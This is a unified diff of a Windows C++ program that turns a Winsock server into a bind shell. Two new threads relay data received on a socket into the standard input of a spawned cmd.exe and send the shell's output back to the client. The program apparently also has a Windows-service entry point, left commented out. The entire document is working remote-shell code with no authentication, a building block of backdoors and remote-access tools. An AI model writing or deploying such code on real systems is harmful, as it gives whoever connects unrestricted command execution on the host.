@@ -4,22 +4,17 @@
 
 #include "Server.h"
 #include "SVC.h"
-using namespace std;
-
-#define BUFSIZE 4096 
-
+//using namespace std;
 
 // Need to link with Ws2_32.lib
 #pragma comment (lib, "Ws2_32.lib")
 // #pragma comment (lib, "Mswsock.lib")
 LPSTR cmdpath = LPSTR("C:\\Windows\\System32\\cmd.exe");
 
-HANDLE hStdIn = NULL;
-int iResult;
 HANDLE hChildProcess = NULL;
-
-
-HANDLE g_hInputFile = NULL;
+WSADATA wsaData;
+SOCKET ListenSocket = INVALID_SOCKET;
+SOCKET ClientSocket = INVALID_SOCKET;
 
 Server::Server() {
 }
@@ -58,55 +53,70 @@ void runCommand(HANDLE hChildStdOut, HANDLE hChildStdIn, HANDLE hChildStdErr)
 	if (!CloseHandle(pi.hThread)) printf("CloseHandle");
 }
 
-BOOL bRunThread = TRUE;
+DWORD WINAPI StdInputFromSocketToPipe(LPVOID lpvThreadParam) {
+	HANDLE hPipe = (HANDLE)lpvThreadParam;
+	char recvbuf[DEFAULT_BUFLEN+2];
+	int recvbuflen = DEFAULT_BUFLEN;
+	DWORD nBytesWrote;
+	while (true) {
 
-DWORD WINAPI GetAndSendInputThread(LPVOID lpvThreadParam){
-	CHAR read_buff[DEFAULT_BUFLEN];
-	DWORD nBytesRead, nBytesWrote;
-	HANDLE hPipeWrite = (HANDLE)lpvThreadParam;
-
-	// Get input from our console and send it to child through the pipe.
-	while (bRunThread)
-	{
-		if (!ReadFile(hStdIn, read_buff, 1, &nBytesRead, NULL))
-			printf("ReadStdin");
-
-		read_buff[nBytesRead] = '\0'; // Follow input with a NULL.
-
-		if (!WriteFile(hPipeWrite, read_buff, nBytesRead, &nBytesWrote, NULL))
-		{
-			if (GetLastError() == ERROR_NO_DATA) {
-				printf("ERROR NO DATA");
-				break; // Pipe was closed (normal exit path).
+		int iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+		recvbuf[iResult] = '\n'; //TODO remove
+		recvbuf[iResult+1] = '\0'; //TODO remove
+		if (iResult > 0) {
+			
+			if (!WriteFile(hPipe, recvbuf, iResult + 1, &nBytesWrote, NULL)) {
+				printf("WRITE FILE ERROR %lu\n", GetLastError());
+				break;
 			}
-			else
-				printf("WriteFile");
+			printf("StdInputFromSocketToPipe received: %s\n\n", recvbuf);
+		}
+		else if (iResult == 0) {
+
+		}
+		else {
+			printf("recv failed with error: %d\n", WSAGetLastError());
+			closesocket(ClientSocket); //TODO not here, but if WaitForMultipleObjects
+			WSACleanup();
+			return 1;
 		}
 	}
-
-	return 1;
 }
 
-int Server::startServer() {
-	WSADATA wsaData;
-	int iResult;
+DWORD WINAPI StdOutputFromPipeToSocket(LPVOID lpvThreadParam) {
+	HANDLE hPipe = (HANDLE)lpvThreadParam;
+	char sendbuf[DEFAULT_BUFLEN+1];
+	int sendbuflen = DEFAULT_BUFLEN;
+	DWORD nBytesRead;
+	while(true){
+		if (!ReadFile(hPipe, sendbuf, sendbuflen, &nBytesRead, NULL) || !nBytesRead)
+		{
+			printf("READ FILE ERROR %lu\n", GetLastError());
+			break;
+		}
+		sendbuf[nBytesRead] = '\0'; //TODO remove
 
-	SOCKET ListenSocket = INVALID_SOCKET;
-	SOCKET ClientSocket = INVALID_SOCKET;
+		int iSendResult = send(ClientSocket, sendbuf, nBytesRead, 0);
+		if (iSendResult == SOCKET_ERROR) {
+			printf("send failed with error: %d\n", WSAGetLastError());
+			closesocket(ClientSocket); //TODO not here, but if WaitForMultipleObjects
+			WSACleanup();
+			return 1;
+		}
+		printf("Bytes sent: %d\n", iSendResult);
+	}
+}
 
-	struct addrinfo *result = NULL;
-	struct addrinfo hints;
-
-	int iSendResult;
-	char recvbuf[DEFAULT_BUFLEN];
-	int recvbuflen = DEFAULT_BUFLEN;
-
+int setupSockets() {
 	// Initialize Winsock
-	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
 		printf("WSAStartup failed with error: %d\n", iResult);
 		return 1;
 	}
+
+	struct addrinfo *result = NULL;
+	struct addrinfo hints;
 
 	ZeroMemory(&hints, sizeof(hints));
 	hints.ai_family = AF_INET;
@@ -162,44 +172,11 @@ int Server::startServer() {
 
 	// No longer need server socket
 	closesocket(ListenSocket);
+	return 0;
+}
 
-	// Receive until the peer shuts down the connection
-	do {
-
-		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-		if (iResult > 0) {
-			recvbuf[iResult] = 0;
-
-			//runCommand(recvbuf);
-			string commandResult = "At least I tried";
-
-			printf("Bytes received: %d\n", iResult);
-
-			printf("COMMAND RESULT: %s\n", commandResult.c_str());
-
-			// Echo the buffer back to the sender
-			iSendResult = send(ClientSocket, commandResult.c_str(), strlen(commandResult.c_str()), 0);
-			if (iSendResult == SOCKET_ERROR) {
-				printf("send failed with error: %d\n", WSAGetLastError());
-				closesocket(ClientSocket);
-				WSACleanup();
-				return 1;
-			}
-			printf("Bytes sent: %d\n", iSendResult);
-		}
-		else if (iResult == 0)
-			printf("Connection closing...\n");
-		else {
-			printf("recv failed with error: %d\n", WSAGetLastError());
-			closesocket(ClientSocket);
-			WSACleanup();
-			return 1;
-		}
-
-	} while (iResult > 0);
-
-	// shutdown the connection since we're done
-	iResult = shutdown(ClientSocket, SD_SEND);
+int closeServer() {
+	int iResult = shutdown(ClientSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR) {
 		printf("shutdown failed with error: %d\n", WSAGetLastError());
 		closesocket(ClientSocket);
@@ -210,13 +187,31 @@ int Server::startServer() {
 	// cleanup
 	closesocket(ClientSocket);
 	WSACleanup();
+	return 0;
+}
+
+int Server::startServer() {
+
+	return setupSockets();
+
+	// Receive until the peer shuts down the connection
+
+	// shutdown the connection since we're done
+
 
 }
 
+
+
+
 int main() {
 	//_ttmain(0, NULL);//Now only as a service
-	//Server server = Server();
-	//server.startServer();
+	Server server = Server();
+	if (server.startServer() == 1) {
+		printf("SETUP SOCKET FAILED");
+		return -1;
+	}
+	
 	SECURITY_ATTRIBUTES saAttr;
 
 	printf("\n->Start of parent execution.\n");
@@ -228,11 +223,10 @@ int main() {
 	saAttr.lpSecurityDescriptor = NULL;
 
 	// Starting to create pipes
-	HANDLE hOutputReadTmp, hOutputRead, hOutputWrite;
-	HANDLE hInputWriteTmp, hInputRead, hInputWrite;
-	HANDLE hErrorWrite;
+	HANDLE hStdOutputReadTmp, hStdOutputCmdForWriting, hStdErrorCmdForWriting;
+	HANDLE hStdInputWriteTmp, hStdInputCmdForReading;
 
-	HANDLE hThread, lThread;
+	HANDLE hThread1, hThread2;
 	DWORD ThreadId1, ThreadId2;
 
 	// Set up the security attributes struct.
@@ -240,40 +234,40 @@ int main() {
 	saAttr.lpSecurityDescriptor = NULL;
 	saAttr.bInheritHandle = TRUE;
 
-
 	// Create the child output pipe.
-	if (!CreatePipe(&hOutputReadTmp, &hOutputWrite, &saAttr, 0))
+	if (!CreatePipe(&hStdOutputReadTmp, &hStdOutputCmdForWriting, &saAttr, 0))
 		printf("CreatePipe\n");
 
 
 	// Create a duplicate of the output write handle for the std error
 	// write handle. This is necessary in case the child application
 	// closes one of its std output handles.
-	if (!DuplicateHandle(GetCurrentProcess(), hOutputWrite,
-		GetCurrentProcess(), &hErrorWrite, 0,
+	if (!DuplicateHandle(GetCurrentProcess(), hStdOutputCmdForWriting,
+		GetCurrentProcess(), &hStdErrorCmdForWriting, 0,
 		TRUE, DUPLICATE_SAME_ACCESS))
 		printf("DuplicateHandle\n");
 
 
 	// Create the child input pipe.
-	if (!CreatePipe(&hInputRead, &hInputWriteTmp, &saAttr, 0))
+	if (!CreatePipe(&hStdInputCmdForReading, &hStdInputWriteTmp, &saAttr, 0))
 		printf("CreatePipe\n");
 
+	HANDLE hStdOutputRead, hStdInputWrite;
 
 	// Create new output read handle and the input write handles. Set
 	// the Properties to FALSE. Otherwise, the child inherits the
 	// properties and, as a result, non-closeable handles to the pipes
 	// are created.
-	if (!DuplicateHandle(GetCurrentProcess(), hOutputReadTmp,
+	if (!DuplicateHandle(GetCurrentProcess(), hStdOutputReadTmp,
 		GetCurrentProcess(),
-		&hOutputRead, // Address of new handle.
+		&hStdOutputRead, // Address of new handle.
 		0, FALSE, // Make it uninheritable.
 		DUPLICATE_SAME_ACCESS))
 		printf("DuplicateHandle\n");
 
-	if (!DuplicateHandle(GetCurrentProcess(), hInputWriteTmp,
+	if (!DuplicateHandle(GetCurrentProcess(), hStdInputWriteTmp,
 		GetCurrentProcess(),
-		&hInputWrite, // Address of new handle.
+		&hStdInputWrite, // Address of new handle.
 		0, FALSE, // Make it uninheritable.
 		DUPLICATE_SAME_ACCESS))
 		printf("DuplicateHandle\n");
@@ -281,67 +275,41 @@ int main() {
 
 	// Close inheritable copies of the handles you do not want to be
 	// inherited.
-	if (!CloseHandle(hOutputReadTmp)) printf("CloseHandle");
-	if (!CloseHandle(hInputWriteTmp)) printf("CloseHandle");
+	//if (!CloseHandle(hStdOutputReadTmp)) printf("CloseHandle");
+	//if (!CloseHandle(hStdInputWriteTmp)) printf("CloseHandle");
 
-	if ((hStdIn = GetStdHandle(STD_INPUT_HANDLE)) == INVALID_HANDLE_VALUE)
-		printf("STANDART_INPUT ERROR\n");
-
-	runCommand(hOutputWrite, hInputRead, hErrorWrite);
+	runCommand(hStdOutputCmdForWriting, hStdInputCmdForReading, hStdErrorCmdForWriting);
 	printf("RUN COMMAND FINISHED!\n");
 
-	if (!CloseHandle(hOutputWrite)) {
+	/* - later
+	if (!CloseHandle(hStdOutputCmdForWriting)) {
 		printf("CloseHandle hOutputWrite ERROR\n");
 	}
 
-	if (!CloseHandle(hInputRead)) {
+	if (!CloseHandle(hStdInputCmdForReading)) {
 		printf("CloseHandle hInputRead ERROR\n");
 	}
 
-	if (!CloseHandle(hErrorWrite)) {
+	if (!CloseHandle(hStdErrorCmdForWriting)) {
 		printf("CloseHandle hErrorWrite ERROR\n");
 	}
+	*/
 
-	hThread = CreateThread(NULL, 0, GetAndSendInputThread, (LPVOID)hInputWrite, 0, &ThreadId1);
-	if (hThread == NULL) printf("CreateThread\n");
+	hThread1 = CreateThread(NULL, 0, StdOutputFromPipeToSocket, (LPVOID)hStdOutputRead, 0, &ThreadId1);
+	if (hThread1 == NULL) printf("StdOutputFromPipeToSocket CreateThread Failed");
 
-	char lpBuffer[DEFAULT_BUFLEN];
-	DWORD nBytesWrote, nBytesRead;
-	const char* command = "0";
-	while (true) {
+	hThread2 = CreateThread(NULL, 0, StdInputFromSocketToPipe, (LPVOID)hStdInputWrite, 0, &ThreadId2);
+	if (hThread2 == NULL) printf("StdInputFromSocketToPipe CreateThread Failed");
 
-		if (!WriteFile(hInputWrite, command, strlen(command) * sizeof(char), &nBytesWrote, NULL)) {
-			printf("WRITE FILE ERROR %lu\n", GetLastError());
-			// Получаем данные тута
-			break;
-		}
-		
-
-		if (!ReadFile(hOutputRead, lpBuffer, sizeof(lpBuffer),
-			&nBytesRead, NULL) || !nBytesRead)
-		{
-			printf("READ FILE ERROR %lu\n", GetLastError());
-			break;
-		}
-		lpBuffer[nBytesRead] = '\0';
-
-		printf(lpBuffer);
-
-	}
-
-
-	if (!CloseHandle(hStdIn)) printf("CloseHandle");
-
-	// Tell the thread to exit and wait for thread to die.
-	bRunThread = FALSE;
-
-	if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
+	if (WaitForSingleObject(hThread1, INFINITE) == WAIT_FAILED)
 		printf("WaitForSingleObject");
-	//if (WaitForSingleObject(lThread, INFINITE) == WAIT_FAILED)
-	//	printf("WaitForSingleObject");
 
-	if (!CloseHandle(hOutputRead)) printf("CloseHandle");
-	if (!CloseHandle(hInputWrite)) printf("CloseHandle");
+	if (WaitForSingleObject(hThread2, INFINITE) == WAIT_FAILED)
+		printf("WaitForSingleObject");
+
+	if (!CloseHandle(hStdOutputRead)) printf("CloseHandle");
+	if (!CloseHandle(hStdInputWrite)) printf("CloseHandle");
+
 	// Write to the pipe that is the standard input for a child process. 
 	// Data is written to the pipe's buffers, so it is not necessary to wait
 	// until the child process is running before writing data.
